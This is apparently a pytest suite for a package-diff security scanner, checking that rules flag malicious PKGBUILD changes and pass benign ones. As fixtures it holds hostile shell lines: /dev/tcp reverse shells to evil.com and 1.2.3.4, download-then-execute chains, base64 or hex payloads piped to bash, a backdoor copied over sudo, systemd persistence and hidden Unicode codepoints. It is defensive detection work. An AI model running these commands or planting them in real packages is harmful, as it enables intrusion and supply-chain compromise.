"""Behavioural tests for the R039+ expanded ruleset and C004-C007.

Each rule is asserted in both directions.  A rule that only ever fires on
its attack case is half-tested: the false-positive direction is what
determines whether it can be enabled by default.
"""

import tomllib

import pytest

from trustsight.analysis import _structural_findings
from trustsight.config import DEFAULT_RULES
from trustsight.differ import extract_urls_from_diff
from trustsight.rules import apply_rules

RULES = {r["id"]: r for r in tomllib.loads(DEFAULT_RULES)["rules"]}


def fires(rule_id: str, lines: list[str]) -> bool:
    """Run one rule through the real engine against raw diff lines."""
    rule = RULES[rule_id]
    resolved = [ln[1:] for ln in lines if ln.startswith("+")]
    return bool(apply_rules(resolved, lines, [rule], include_experimental=True))


# --- Execution and obfuscation ---

@pytest.mark.parametrize("line", [
    '+  eval "$payload"',
    "+  eval $(echo cmd)",
    "+  eval `cat /tmp/x`",
])
def test_r039_eval_dynamic(line):
    assert fires("R039", [line])


def test_r039_ignores_literal_eval():
    assert not fires("R039", ["+  eval set -- --prefix=/usr"])


@pytest.mark.parametrize("line", ['+  bash -c "$cmd"', "+  sh -c $(get_payload)"])
def test_r040_shell_c_dynamic(line):
    assert fires("R040", [line])


def test_r040_ignores_literal_shell_c():
    assert not fires("R040", ['+  bash -c "make install"'])


@pytest.mark.parametrize("line", [
    "+  bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
    "+  exec 3<>/dev/tcp/evil.com/80",
])
def test_r041_dev_tcp(line):
    """The proposal's '> ?/dev/tcp/' missed the '>&' form, which is the
    one every reverse-shell one-liner actually uses."""
    assert fires("R041", [line])


def test_r042_download_then_execute():
    assert fires("R042", ["+  curl -o /tmp/x https://e.com/x && chmod +x /tmp/x && /tmp/x"])


def test_r042_ignores_plain_download():
    assert not fires("R042", ["+  curl -o out.tar.gz https://github.com/a/b.tar.gz"])


def test_r043_base64_blob():
    assert fires("R043", ["+  base64 -d <<< $PAYLOAD | bash"])


def test_r043_ignores_base64_of_a_file():
    assert not fires("R043", ["+  base64 -d file.b64 > out.bin"])


def test_r044_interpreter_network():
    assert fires("R044", ["+  perl -e \"use LWP::Simple\""])


def test_r044_ignores_plain_interpreter():
    assert not fires("R044", ['+  python -c "print(1)"'])


def test_r045_binary_encoding_pipe():
    assert fires("R045", ["+  xxd -r -p blob.hex | sh"])


def test_r045_ignores_xxd_to_header():
    assert not fires("R045", ["+  xxd -i file.bin > file.h"])


# --- Source provenance ---

def test_r046_ip_address_source():
    assert fires("R046", ['+source=("http://192.168.1.5/pkg.tar.gz")'])


def test_r046_ignores_domain_source():
    assert not fires("R046", ['+source=("https://github.com/a/b.tar.gz")'])


def test_r046_does_not_fire_on_removal():
    """added_only: deleting a suspicious line must not raise the score."""
    assert not fires("R046", ['-source=("http://192.168.1.5/pkg.tar.gz")'])


def test_r047_non_standard_port():
    assert fires("R047", ['+source=("https://evil.com:31337/pkg.tar.gz")'])


@pytest.mark.parametrize("port", ["443", "80", "8080", "8443"])
def test_r047_ignores_standard_ports(port):
    assert not fires("R047", [f'+source=("https://example.com:{port}/pkg.tar.gz")'])


def test_r048_free_registrar_tld():
    assert fires("R048", ['+source=("https://evil.tk/pkg.tar.gz")'])


def test_r048_ignores_normal_tld():
    """The proposal anchored this with '$', which never matches a source
    line ending in '\")'."""
    assert not fires("R048", ['+source=("https://github.com/a/b.tar.gz")'])


# --- Build-time weakening ---

def test_r049_compiler_plugin():
    assert fires("R049", ['+  CFLAGS="$CFLAGS -fplugin=/tmp/evil.so"'])


def test_r049_ignores_normal_cflags():
    assert not fires("R049", ['+  CFLAGS="$CFLAGS -O2 -march=native"'])


def test_r050_hardening_disabled():
    assert fires("R050", ['+  CFLAGS+=" -fno-stack-protector"'])


def test_r050_ignores_normal_flags():
    assert not fires("R050", ['+  CFLAGS+=" -Wall -Wextra"'])


# --- Packaging subterfuge ---

def test_r051_network_in_pkgver():
    assert fires("R051", ["+pkgver() {", "+  curl -s https://api.evil.com/v", "+}"])


def test_r051_ignores_git_describe():
    """git describe is the standard VCS pkgver idiom and is local-only.
    Flagging it would fire on the entire vcs_git stratum."""
    assert not fires("R051", ["+pkgver() {", "+  git describe --long --tags", "+}"])


def test_r051_ignores_network_in_build():
    """Scoping is the point: curl in build() is routine."""
    assert not fires("R051", ["+build() {", "+  curl -o d.tar.gz https://e.com/d", "+}"])


def test_r052_dotfile_to_user_profile():
    assert fires("R052", ['+  install -Dm644 evil "$HOME/.bashrc"'])


def test_r052_ignores_skel_dotfile_in_pkgdir():
    assert not fires("R052", ['+  install -Dm644 skel "$pkgdir/etc/skel/.bashrc"'])


@pytest.mark.parametrize("line", [
    '+  chmod 4755 "$pkgdir/usr/bin/tool"',
    '+  chmod 2755 "$pkgdir/usr/bin/tool"',
    '+  chmod u+s "$pkgdir/usr/bin/tool"',
])
def test_r053_setuid_inside_package_root(line):
    assert fires("R053", [line])
    assert not fires("R059", [line])


@pytest.mark.parametrize("line", [
    '+  chmod u+s "/usr/bin/mullvad-exclude"',
    "+  chmod 4755 /usr/local/bin/helper",
])
def test_r059_setuid_outside_package_root(line):
    """An absolute path is the live filesystem, not the staged package."""
    assert fires("R059", [line])
    assert not fires("R053", [line])


@pytest.mark.parametrize("mode", ["644", "755", "600", "640", "664", "+x"])
def test_r053_ignores_ordinary_modes(mode):
    """The proposal's regex was inverted: it matched 644 and missed 4755."""
    assert not fires("R053", [f'+  chmod {mode} "$pkgdir/etc/tool.conf"'])


def test_r054_persistence_outside_package_root():
    assert fires("R054", ["+  cp evil.timer /etc/systemd/system/evil.timer"])


@pytest.mark.parametrize("line", [
    '+  install -Dm644 t.service "$pkgdir/usr/lib/systemd/system/t.service"',
    '+  install -Dm644 job "$pkgdir/etc/cron.d/job"',
])
def test_r054_ignores_pkgdir_units(line):
    """Installing a unit into $pkgdir is what a correct PKGBUILD does."""
    assert not fires("R054", [line])


def test_r055_git_clone_variable_branch():
    assert fires("R055", ["+  git clone --branch $ref https://github.com/a/b"])


def test_r055_ignores_literal_branch():
    assert not fires("R055", ["+  git clone --branch v1.0 https://github.com/a/b"])


def test_r056_download_then_source():
    assert fires("R056", ["+  curl -o /tmp/env https://e.com/env && source /tmp/env"])


# --- Transport security ---

@pytest.mark.parametrize("line", [
    "+  curl -k https://evil.com/x",
    "+  curl --insecure https://evil.com/x",
    "+  wget --no-check-certificate https://e.com/x",
])
def test_r057_tls_disabled(line):
    assert fires("R057", [line])


def test_r057_ignores_normal_curl():
    assert not fires("R057", ["+  curl -sSL https://github.com/a/b -o b"])


def test_r057_ignores_flag_containing_dash_k():
    assert not fires("R057", ["+  curl --keepalive-time 10 https://e.com/x"])


@pytest.mark.parametrize("line", [
    "+  cp backdoor /usr/bin/sudo",
    "+  install -Dm644 evil.conf /etc/profile.d/e.sh",
])
def test_r058_write_outside_package_root(line):
    assert fires("R058", [line])


@pytest.mark.parametrize("line", [
    '+  install -Dm644 c "$pkgdir/etc/tool.conf"',
    '+  install -Dm755 t "$pkgdir/usr/bin/tool"',
])
def test_r058_ignores_pkgdir_writes(line):
    assert not fires("R058", [line])


# --- Experimental gating ---

_EXPERIMENTAL_RULE = {
    "id": "R900", "name": "Probe", "pattern": r"\bmarker-token\b",
    "severity": "HIGH", "category": "test", "match_target": "raw_line",
    "experimental": True,
}


def test_experimental_rules_are_off_by_default():
    lines = ["+  marker-token here"]
    assert apply_rules([lines[0][1:]], lines, [_EXPERIMENTAL_RULE]) == []


def test_experimental_rules_run_when_enabled():
    lines = ["+  marker-token here"]
    assert apply_rules(
        [lines[0][1:]], lines, [_EXPERIMENTAL_RULE], include_experimental=True
    )


def test_shipped_ruleset_has_no_experimental_rules_left():
    """R039+ were promoted after corpus calibration; the flag stays
    supported for future additions."""
    assert [r["id"] for r in RULES.values() if r.get("experimental")] == []


def test_promoted_rules_run_without_the_flag():
    lines = ['+  eval "$payload"']
    assert apply_rules([lines[0][1:]], lines, [RULES["R039"]])


def test_non_experimental_rules_are_unaffected():
    lines = ["+  curl https://e.com/x.sh | bash"]
    resolved = [ln[1:] for ln in lines]
    assert apply_rules(resolved, lines, [RULES["R001"]])


# --- Programmatic C-rules ---

def _findings(diff: str, buckets=None, maintainer_changed=False) -> set[str]:
    changes = extract_urls_from_diff(diff)
    found = _structural_findings(
        diff, changes, buckets, maintainer_changed=maintainer_changed
    )
    return {f["rule_id"] for f in found}


def test_c004_checksum_removed_for_unchanged_source():
    diff = (
        " source=(\"https://example.com/pkg-1.0.tar.gz\")\n"
        "-sha256sums=('abc123')\n"
    )
    assert "C004" in _findings(diff)


def test_c004_ignores_checksum_replacement():
    diff = "-sha256sums=('abc123')\n+sha256sums=('def456')\n"
    assert "C004" not in _findings(diff)


def test_c005_binary_artifact_from_untrusted_source():
    diff = '+source=("https://unknown-cdn.example/tool.AppImage")\n'
    buckets = {"https://unknown-cdn.example/tool.AppImage": "unknown"}
    assert "C005" in _findings(diff, buckets)


def test_c005_ignores_binary_from_trusted_forge():
    """-bin packages repackaging a GitHub release are the norm."""
    diff = '+source=("https://github.com/acme/tool/releases/download/v1/tool.AppImage")\n'
    url = "https://github.com/acme/tool/releases/download/v1/tool.AppImage"
    assert "C005" not in _findings(diff, {url: "trusted_forge"})


def test_c006_maintainer_change_with_new_domain():
    diff = (
        '-source=("https://old.example.com/pkg-1.0.tar.gz")\n'
        '+source=("https://new-cdn.example/pkg-1.0.tar.gz")\n'
    )
    assert "C006" in _findings(diff, maintainer_changed=True)


def test_c006_requires_both_signals():
    diff = (
        '-source=("https://old.example.com/pkg-1.0.tar.gz")\n'
        '+source=("https://new-cdn.example/pkg-1.0.tar.gz")\n'
    )
    assert "C006" not in _findings(diff, maintainer_changed=False)


def test_c006_ignores_same_domain_under_new_maintainer():
    diff = (
        '-source=("https://example.com/pkg-1.0.tar.gz")\n'
        '+source=("https://example.com/pkg-2.0.tar.gz")\n'
    )
    assert "C006" not in _findings(diff, maintainer_changed=True)


def test_c007_command_substitution_in_source_array():
    """source=() is evaluated at parse time, before any build function."""
    diff = '+source=("https://e.com/$(curl -s https://evil.com/path)")\n'
    assert "C007" in _findings(diff)


def test_c007_ignores_variable_expansion():
    diff = '+source=("https://e.com/$pkgname-$pkgver.tar.gz")\n'
    assert "C007" not in _findings(diff)


# --- Regressions found by measuring against the benign corpus ---

@pytest.mark.parametrize("line", [
    "+GenericName[ml]=വെബ് ബ്രൌസര്‍",
    "+GenericName[lo]=ຕົວ​ທ່ອງ",
])
def test_r013_ignores_legitimate_joiners_in_non_latin_text(line):
    """U+200B-U+200D are mandatory joiners in Malayalam, Lao and other
    scripts. R013 is FATAL, so firing on a localized desktop-entry string
    scored benign browser packages 100/100."""
    assert not fires("R013", [line])


@pytest.mark.parametrize("cp", [
    "‪", "‮", "⁦", "⁩",   # bidi overrides / isolates
    "​", "‌", "‍",             # zero-width, ASCII context
    "‎", "‏",                       # directional marks
    "⁠", "﻿", "\U000e0001",         # invisible op, BOM, tag char
])
@pytest.mark.parametrize("template", [
    "+comment with {cp} here",
    '+source=("https://evil.com{cp}/pkg.tar.gz")',
    '+  echo {cp} "hidden cmd"',
])
def test_r013_fires_on_deceptive_codepoints_in_ascii_context(cp, template):
    """U+200E/200F, U+2060-2064 and the tag block were absent from the
    original pattern, which is where the documented recall gap came from."""
    assert fires("R013", [template.format(cp=cp)])


@pytest.mark.parametrize("line", [
    '+  install -Dm644 ${srcdir}/it87.conf "${pkgdir}"/usr/lib/depmod.d/it87.conf',
    '+  install -dm755 "${pkgdir}"/etc/jailbox/config.d',
    '+    echo "install r8169 /usr/bin/modprobe r8125" > "${pkgdir}/etc/m.conf"',
])
def test_r058_ignores_pkgdir_idioms(line):
    """`"${pkgdir}"/usr/lib/...` closes the quote before the path, and an
    absolute path quoted inside an echo string is not a write."""
    assert not fires("R058", [line])


def test_r058_still_fires_on_real_absolute_write_via_sudo():
    assert fires("R058", ["+sudo tee -a /etc/dkms/framework.conf << 'EOF'"])


# --- rules.toml must not drift from unicode.py ---

def test_r013_covers_every_codepoint_unicode_module_enumerates():
    """unicode.py is the authoritative list of deceptive codepoints.
    R013's pattern once omitted U+200E/U+200F, U+2060-U+2064 and the tag
    block, which is where the documented recall gap came from. This test
    fails if the two ever diverge again."""
    import re

    from trustsight import unicode as u

    pattern = re.compile(RULES["R013"]["pattern"])
    ranges = [
        (0x202A, 0x202E), (0x2066, 0x2069), (0x2060, 0x2064),
        (0xE0000, 0xE007F), (0x200B, 0x200F), (0xFEFF, 0xFEFF),
    ]
    missed = [
        hex(cp)
        for lo, hi in ranges
        for cp in range(lo, hi + 1)
        if not pattern.search(f"evil.com{chr(cp)}/x")
    ]
    assert missed == [], f"R013 does not cover: {missed}"
    # And every one of them is recognised by the module itself.
    for lo, hi in ranges:
        assert u.COMBINED.search(chr(lo)), f"unicode.COMBINED missing {hex(lo)}"


def test_unconditional_codepoints_fire_regardless_of_neighbours():
    """Bidi overrides have no legitimate use, so context does not matter."""
    import re

    from trustsight import unicode as u

    pattern = re.compile(RULES["R013"]["pattern"])
    for cp in (0x202E, 0x2066, 0x2060, 0xE0001):
        ch = chr(cp)
        assert u.UNCONDITIONAL.search(ch), f"{hex(cp)} should be unconditional"
        # surrounded by non-ASCII, where contextual codepoints are allowed
        assert pattern.search(f"മല{ch}യാ"), f"{hex(cp)} must still fire"


def test_contextual_codepoints_are_allowed_inside_non_latin_text():
    import re

    from trustsight import unicode as u

    pattern = re.compile(RULES["R013"]["pattern"])
    for cp in (0x200B, 0x200C, 0x200D):
        ch = chr(cp)
        assert u.CONTEXTUAL.search(ch)
        assert not pattern.search(f"മല{ch}യാ"), f"{hex(cp)} must not fire in Malayalam"
        assert pattern.search(f"evil.com{ch}/x"), f"{hex(cp)} must fire in ASCII"
